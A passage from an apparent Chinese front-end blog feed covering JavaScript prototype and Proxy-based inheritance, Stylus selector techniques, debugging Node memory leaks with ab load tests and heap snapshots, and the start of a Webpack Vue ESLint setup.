class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * subInstance.__proto__ -&gt; SubClass.prototype</span></span><br><span class="line"><span class="comment"> * SubClass.prototype.__proto__ -&gt; SuperClass.prototype</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">inherit</span>(<span class="params">SubClass, SuperClass</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> parent = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="title class_">SuperClass</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line">  <span class="title class_">SubClass</span>.<span class="property"><span class="keyword">prototype</span></span> = parent;</span><br><span class="line">  <span class="comment">// 修正 constructor</span></span><br><span class="line">  <span class="title class_">SubClass</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> = <span class="title class_">SubClass</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Animal</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name || <span class="string">&quot;unknown&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">eat</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ku ku&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Cat</span>(<span class="params">name, age</span>) &#123;</span><br><span class="line">  <span class="title class_">Animal</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, name);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">age</span> = age || <span class="title class_">NaN</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">inherit</span>(<span class="title class_">Cat</span>, <span class="title class_">Animal</span>);</span><br><span class="line"><span class="title class_">Cat</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">bark</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;mew~&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cat = <span class="keyword">new</span> <span class="title class_">Cat</span>(<span class="string">&quot;YiDianDian&quot;</span>, <span class="string">&quot;2 month&quot;</span>);</span><br><span class="line">cat.<span class="title function_">eat</span>();</span><br><span class="line">cat.<span class="title function_">bark</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: cat.<span class="property">name</span>,</span><br><span class="line">  <span class="attr">age</span>: cat.<span class="property">age</span>,</span><br><span class="line">&#125;); <span class="comment">// &#123; name: &#x27;YiDianDian&#x27;, age: &#x27;2 month&#x27; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;=================&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(cat <span class="keyword">instanceof</span> <span class="title class_">Animal</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(cat.<span class="property">constructor</span>); <span class="comment">// [Function: Cat]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(cat.<span class="property">__proto__</span>.<span class="property">__proto__</span> === <span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Cat</span>.<span class="property">__proto__</span> === <span class="title class_">Animal</span>); <span class="comment">// false</span></span><br></pre></td></tr></table></figure><h1 id="增强寄生组合式继承"><a href="#增强寄生组合式继承" class="headerlink" title="增强寄生组合式继承"></a>增强寄生组合式继承</h1><p>组合式继承已经快到头了，但是我们发现调用 <code>inherit</code> 方法必须在向子类挂载 <code>prototype</code> 属性或方法之前，否则，子类的原型上挂载的属性或方法就会被覆盖：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Cat</span>(<span class="params">name, age</span>) &#123;</span><br><span class="line">  <span class="title class_">Animal</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, name);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">age</span> = age || <span class="title class_">NaN</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Cat</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">bark</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;mew~&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title function_">inherit</span>(<span class="title class_">Cat</span>, <span class="title class_">Animal</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cat = <span class="keyword">new</span> <span class="title class_">Cat</span>(<span class="string">&quot;YiDianDian&quot;</span>, <span class="string">&quot;2 month&quot;</span>);</span><br><span class="line">cat.<span class="title function_">bark</span>(); <span class="comment">// throw error: bark is not a function</span></span><br></pre></td></tr></table></figure><p>为了解决这个问题，我们可以使用 <code>Object.defineProperty</code> 在 <code>inherit</code> 方法中覆盖子类的 <code>prototype</code> 前将子类已有的原型链上的属性挂载给创建的空对象上：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function inherit(SubClass, SuperClass) &#123;</span><br><span class="line">  const parent = Object.create(SuperClass.prototype);</span><br><span class="line"><span class="addition">+ for (let key in SubClass.prototype) &#123;</span></span><br><span class="line"><span class="addition">+   Object.defineProperty(parent, key, &#123;</span></span><br><span class="line"><span class="addition">+     value: SubClass.prototype[key],</span></span><br><span class="line"><span class="addition">+   &#125;);</span></span><br><span class="line"><span class="addition">+ &#125;</span></span><br><span class="line">  SubClass.prototype = parent;</span><br><span class="line">  // 修正 constructor</span><br><span class="line">  SubClass.prototype.constructor = SubClass;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整的实现如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * subInstance.__proto__ -&gt; SubClass.prototype</span></span><br><span class="line"><span class="comment"> * SubClass.prototype.__proto__ -&gt; SuperClass.prototype</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">inherit</span>(<span class="params">SubClass, SuperClass</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> parent = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="title class_">SuperClass</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> <span class="title class_">SubClass</span>.<span class="property"><span class="keyword">prototype</span></span>) &#123;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(parent, key, &#123;</span><br><span class="line">      <span class="attr">value</span>: <span class="title class_">SubClass</span>.<span class="property"><span class="keyword">prototype</span></span>[key],</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title class_">SubClass</span>.<span class="property"><span class="keyword">prototype</span></span> = parent;</span><br><span class="line">  <span class="comment">// 修正 constructor</span></span><br><span class="line">  <span class="title class_">SubClass</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> = <span class="title class_">SubClass</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Animal</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name || <span class="string">&quot;unknown&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">eat</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ku ku&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Cat</span>(<span class="params">name, age</span>) &#123;</span><br><span class="line">  <span class="title class_">Animal</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, name);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">age</span> = age || <span class="title class_">NaN</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Cat</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">bark</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;mew~&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">inherit</span>(<span class="title class_">Cat</span>, <span class="title class_">Animal</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cat = <span class="keyword">new</span> <span class="title class_">Cat</span>(<span class="string">&quot;YiDianDian&quot;</span>, <span class="string">&quot;2 month&quot;</span>);</span><br><span class="line">cat.<span class="title function_">eat</span>();</span><br><span class="line">cat.<span class="title function_">bark</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: cat.<span class="property">name</span>,</span><br><span class="line">  <span class="attr">age</span>: cat.<span class="property">age</span>,</span><br><span class="line">&#125;); <span class="comment">// &#123; name: &#x27;YiDianDian&#x27;, age: &#x27;2 month&#x27; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;=================&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(cat <span class="keyword">instanceof</span> <span class="title class_">Animal</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(cat.<span class="property">constructor</span>); <span class="comment">// [Function: Cat]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(cat.<span class="property">__proto__</span>.<span class="property">__proto__</span> === <span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Cat</span>.<span class="property">__proto__</span> === <span class="title class_">Animal</span>); <span class="comment">// false</span></span><br></pre></td></tr></table></figure><h1 id="使用-Proxy-实现继承"><a href="#使用-Proxy-实现继承" class="headerlink" title="使用 Proxy 实现继承"></a>使用 Proxy 实现继承</h1><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy#%E6%89%A9%E5%B1%95%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0">来源</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">extend</span>(<span class="params">sup, base</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> descriptor = <span class="title class_">Object</span>.<span class="title function_">getOwnPropertyDescriptor</span>(</span><br><span class="line">    base.<span class="property"><span class="keyword">prototype</span></span>,</span><br><span class="line">    <span class="string">&quot;constructor&quot;</span>,</span><br><span class="line">  );</span><br><span class="line">  base.<span class="property"><span class="keyword">prototype</span></span> = <span class="title class_">Object</span>.<span class="title function_">create</span>(sup.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line">  <span class="keyword">var</span> handler = &#123;</span><br><span class="line">    <span class="attr">construct</span>: <span class="keyword">function</span> (<span class="params">target, args</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> obj = <span class="title class_">Object</span>.<span class="title function_">create</span>(base.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">apply</span>(target, obj, args);</span><br><span class="line">      <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">apply</span>: <span class="keyword">function</span> (<span class="params">target, that, args</span>) &#123;</span><br><span class="line">      sup.<span class="title function_">apply</span>(that, args);</span><br><span class="line">      base.<span class="title function_">apply</span>(that, args);</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">var</span> proxy = <span class="keyword">new</span> <span class="title class_">Proxy</span>(base, handler);</span><br><span class="line">  descriptor.<span class="property">value</span> = proxy;</span><br><span class="line">  <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(base.<span class="property"><span class="keyword">prototype</span></span>, <span class="string">&quot;constructor&quot;</span>, descriptor);</span><br><span class="line">  <span class="keyword">return</span> proxy;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Person</span> = <span class="keyword">function</span> (<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Boy</span> = <span class="title function_">extend</span>(<span class="title class_">Person</span>, <span class="keyword">function</span> (<span class="params">name, age</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">age</span> = age;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Boy</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sex</span> = <span class="string">&quot;M&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Peter</span> = <span class="keyword">new</span> <span class="title class_">Boy</span>(<span class="string">&quot;Peter&quot;</span>, <span class="number">13</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Peter</span>.<span class="property">sex</span>); <span class="comment">// &quot;M&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Peter</span>.<span class="property">name</span>); <span class="comment">// &quot;Peter&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Peter</span>.<span class="property">age</span>); <span class="comment">// 13</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试题 </tag>
            
            <tag> JavaScript </tag>
            
            <tag> 面向对象 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于 Stylus 的常用技巧</title>
      <link href="/2023/12/c43ec653da24.html"/>
      <url>/2023/12/c43ec653da24.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://stylus-lang.com/try.html">Stylus Playground</a></p><h1 id="1-选择器"><a href="#1-选择器" class="headerlink" title="1. 选择器"></a>1. 选择器</h1><h2 id="Parent-选择器"><a href="#Parent-选择器" class="headerlink" title="Parent 选择器"></a>Parent 选择器</h2><p> <code>&amp;</code> 字符可以用于父级选择器：</p><figure class="highlight styl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">textarea</span></span><br><span class="line"><span class="selector-tag">input</span></span><br><span class="line">  <span class="attribute">color</span> <span class="number">#A7A7A7</span></span><br><span class="line">  <span class="selector-pseudo">&amp;:hover</span></span><br><span class="line">    <span class="attribute">color</span> <span class="number">#000</span></span><br></pre></td></tr></table></figure><p>编译为：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">textarea</span>,</span><br><span class="line"><span class="selector-tag">input</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#a7a7a7</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">textarea</span><span class="selector-pseudo">:hover</span>,</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="部分选择器"><a href="#部分选择器" class="headerlink" title="部分选择器"></a>部分选择器</h2><p>你可以在任意位置使用部分选择器（Partial Reference）向上选中已有的选择器，使用 <code>^[N]</code> 表示。</p><p>当 N 为正数时，代表从上向下数第 N 个选择器：</p><figure class="highlight styl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.foo</span></span><br><span class="line">&amp;__bar</span><br><span class="line"><span class="selector-class">.text</span></span><br><span class="line"><span class="attribute">color</span> red</span><br><span class="line"></span><br><span class="line">^<span class="selector-attr">[0]</span><span class="selector-class">.is-primary</span></span><br><span class="line"><span class="selector-class">.text</span></span><br><span class="line"><span class="attribute">color</span> green</span><br></pre></td></tr></table></figure><p>编译为：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.foo__bar</span> <span class="selector-class">.text</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#f00</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.foo</span><span class="selector-class">.is-primary</span> <span class="selector-class">.text</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#008000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>^[0]</code> 可以直接使用 <code>/.</code> 根选择器（<a href="https://stylus-lang.com/docs/selectors.html#root-reference">Root Reference</a>）来代替。</p></blockquote><p>N 为负数时，表示从当前选择器向上第 N 位的的选择器：</p><figure class="highlight styl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.foo</span></span><br><span class="line">&amp;__bar</span><br><span class="line"><span class="selector-class">.text</span></span><br><span class="line"><span class="attribute">color</span> red</span><br><span class="line"></span><br><span class="line">^<span class="selector-attr">[-1]</span><span class="selector-class">.is-primary</span></span><br><span class="line"><span class="selector-class">.text</span></span><br><span class="line"><span class="attribute">color</span> green</span><br></pre></td></tr></table></figure><p>编译后：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.foo__bar</span> <span class="selector-class">.text</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#f00</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.foo__bar</span><span class="selector-class">.is-primary</span> <span class="selector-class">.text</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#008000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>合理的结合父级选择器 <code>&amp;</code> 可以保留当前选择器的层级，从简化 CSS 的写法，比如 <code>.foo</code> 元素有一个 <code>.is-primary</code> 的状态，希望在该状态下 <code>.text</code> 元素的颜色为 <code>green</code>，就可以写为：</p><figure class="highlight styl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.foo</span></span><br><span class="line">&amp;__bar</span><br><span class="line"><span class="selector-class">.text</span></span><br><span class="line"><span class="attribute">color</span> red</span><br><span class="line"></span><br><span class="line">^<span class="selector-attr">[0]</span><span class="selector-class">.is-primary</span> &amp;</span><br><span class="line"><span class="attribute">color</span> green</span><br></pre></td></tr></table></figure><p>编译后：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.foo__bar</span> <span class="selector-class">.text</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#f00</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.foo</span><span class="selector-class">.is-primary</span> <span class="selector-class">.foo__bar</span> <span class="selector-class">.text</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#008000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
            <tag> stylus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Node 服务内存溢出排查方案</title>
      <link href="/2023/12/f61b74b0d894.html"/>
      <url>/2023/12/f61b74b0d894.html</url>
      
        <content type="html"><![CDATA[<h1 id="对于本地可复现的进行调试"><a href="#对于本地可复现的进行调试" class="headerlink" title="对于本地可复现的进行调试"></a>对于本地可复现的进行调试</h1><p>使用 <code>ab</code> 指令可以在本地进行压测，如：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ab -n 2000 -c 100 http://localhost:8090/home</span><br></pre></td></tr></table></figure><p>然后通过 <code>--inspect</code> 指令链接 chrome 调试器进行调试：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node --inspect --heapsnapshot-signal=SIGUSR2 ./server.js</span><br></pre></td></tr></table></figure><blockquote><p><code>--heapsnapshot-signal=SIGUSR2</code> 表示接收到 SIGUSR2 信号时生成堆内存快照。</p></blockquote><p>然后使用浏览器访问 <a href="chrome://inspect/#devices">chrome://inspect/#devices</a>，点击 inspect：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240427195201.png" alt=""><br>弹出调试面板后就可以在 Memory 选项卡下生成堆快照了：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240427195442.png" alt=""></p><p>通常我们可以在项目启动时进行一次快照生成，然后在压测完成后再生成一个快照，在选项卡中选择展示两个快照的对比结果，就能展示出来压测后新创建的内存信息，这里的排序通常按照 <code>Retained Size</code> 表示当前对象及自身所占的内存其引用对象的总内存：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240427195949.png" alt=""></p><p>上面结果中发现 array 类型和 string 类型的数据内存占用很大，比较可疑，可以对其进行展开操作，并展示其具体值：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240427200401.png" alt=""></p><p>由上图的对象信息可以查看到其创建对象的变量名、以及调用位置：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240427200447.png" alt=""></p><p>我们对变量和函数名称进行查找，就能发现具体原因是因为创建了一个未销毁的全局变量：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240427200652.png" alt=""></p><h1 id="对于线上存在的内存溢出问题"><a href="#对于线上存在的内存溢出问题" class="headerlink" title="对于线上存在的内存溢出问题"></a>对于线上存在的内存溢出问题</h1><p>TODO</p><h1 id="为了防止内存溢出我们应该做什么？"><a href="#为了防止内存溢出我们应该做什么？" class="headerlink" title="为了防止内存溢出我们应该做什么？"></a>为了防止内存溢出我们应该做什么？</h1><ol><li>注意全局变量；</li><li>内存溢出的本质就是对象被占用，只要确保对象没有没持续引用，哪怕是控制台输出其都是一个被占用的状态；</li><li>为某个对象添加重复的监听事件也可能导致内存不被销毁；</li><li>避免使用匿名函数，这会让代码调试变得很难，调试时也注意关闭 terser 等代码压缩和混淆；</li><li>TODO 。。。</li></ol><h1 id="内存溢出问题记录"><a href="#内存溢出问题记录" class="headerlink" title="内存溢出问题记录"></a>内存溢出问题记录</h1><p>场景：</p><ul><li>Vue3 的 computed 占用 reactive 对象；</li><li>全局 pina 没有销毁；</li><li>在组件中创建了对象，但是在组建卸载时没有正确销毁，或者对象是异步创建的，组件销毁时执行的清理函数没有拿到创建的对象；</li></ul><p>什么情况会造成内存溢出：</p><ul><li>全局变量未删除</li><li>对象的循环引用</li></ul>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
          <category> Node </category>
          
      </categories>
      
      
        <tags>
            
            <tag> node </tag>
            
            <tag> 内存溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Webpack 操练场 ③：使用 Webpack 构建 Vue 开发环境</title>
      <link href="/2023/12/bbdaf12050df.html"/>
      <url>/2023/12/bbdaf12050df.html</url>
      
        <content type="html"><![CDATA[<h1 id="使用-Webpack-构建-Vue-开发环境"><a href="#使用-Webpack-构建-Vue-开发环境" class="headerlink" title="使用 Webpack 构建 Vue 开发环境"></a>使用 Webpack 构建 Vue 开发环境</h1><p>对应代码：<a href="https://github.com/EsunR/webpack-playground/tree/main/templates/vue">https://github.com/EsunR/webpack-playground/tree/main/templates/vue</a></p><blockquote><p>本章节示例的 Vue 环境为 Vue3，基于 TypeScript 构建</p></blockquote><h2 id="调整-Eslint-规则"><a href="#调整-Eslint-规则" class="headerlink" title="调整 Eslint 规则"></a>调整 Eslint 规则</h2><p>如果我们想要 Eslint 支持 Vue 的语法校验，可以通过安装如下几个包来实现：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pnpm install eslint-plugin-vue eslint-plugin-prettier-vue -D</span><br></pre></td></tr></table></figure><ul><li>eslint-plugin-vue：使 eslint 支持 Vue 语法校验的插件</li><li>eslint-plugin-prettier-vue：在 Vue 项目中使用该插件替代 eslint-plugin-prettier，以支持 Vue 语法校验</li></ul><p>调整 eslint 配置为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 